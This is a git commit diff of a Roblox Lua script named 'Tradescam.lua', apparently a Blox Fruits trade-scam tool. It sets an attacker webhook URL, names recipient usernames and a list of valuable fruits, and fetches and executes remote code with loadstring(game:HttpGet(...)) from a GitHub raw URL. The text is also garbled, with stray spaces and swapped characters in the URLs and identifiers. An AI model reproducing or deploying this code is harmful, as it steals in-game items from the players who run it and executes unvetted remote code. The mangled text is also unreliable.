d1485b1ac843d386f4b39dff9d7caec4d4df2799
realredzhubv2 <abhichand2344@gmail.com>
2025-03-27 01:24:11 +0530

    Update Tradescam.lua

--- Tradescam.lua
+++ Tradescam.lua
@@ -1,7 +1,11 @@
-Webhook = ""https:/webhook-protect.vercel.app/api/webhook?id=WmtxS3Mybl9FY2lfOFBwWmQtdXlFdzpud1VOeU05c3h1dUZaRm5Hd0lJc2JXN0VSc1Z5bldxR3M0R2lzczA0Q0lQckVPQm1tMEgyNUo0bWxOUWVwLUs1dkwtQXpIN3VBX3l6TkE5VWo1ajFFcGtHcGlxRHo0eWtIN2MzT2FFakxxZkFOME5XQ09EdTBXYTZ2SzNxcDNJdF80MG9HNFpwZHFBV0JTSmc5MTBPNURKNnlsaGZVQWVPTVRWOXNUSjZsYXM"" << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook? id=WmtxS3Mybl9FY2lfOFBwWmQtdXIF dzpud1VOeU05c3h1dUZaRm5Hd0lJc2J XNOVSc1Z5bldxR3MOR2lzczA0Q0lQckV PQm1tMEgyNUo0bWxOUWVwLUs1dkwt QXpIN3VBX316TkE5VWolajFFcGtHcGlxR HoOeWtIN2MzT2FFakxxZkFOME5XQ09 EdTBXYTZ2SzNxcDNJdF80MG9HNFpw ZHFBVOJTSmc5MTBPNURKNnlsaGZVQ WVPTVRWOXNUSJZsYXM" -- << Your
 
-Usernames = {"56devili", "9DEAD_LIGHT"} username(-s). << Your
+Webhook
 
-Fruits ToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "T-Rex-T-Rex"} -- << Fruits you want
+Usernames = {"56devili",
 
-loadstring(game: HttpGet("https://raw .githubusercontent.com/surelyco /CutestCodes/refs/heads/main/V2"))()
+"9DEAD_LIGHT"} -- << Your username(-s).
+
+Fruits ToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "T-Rex-T-Rex"} << Fruits you want
+
+loadstring(game:HttpGet("https://raw.gi thubusercontent.com/surelyco/CutestC odes/refs/heads/main/V2"))()
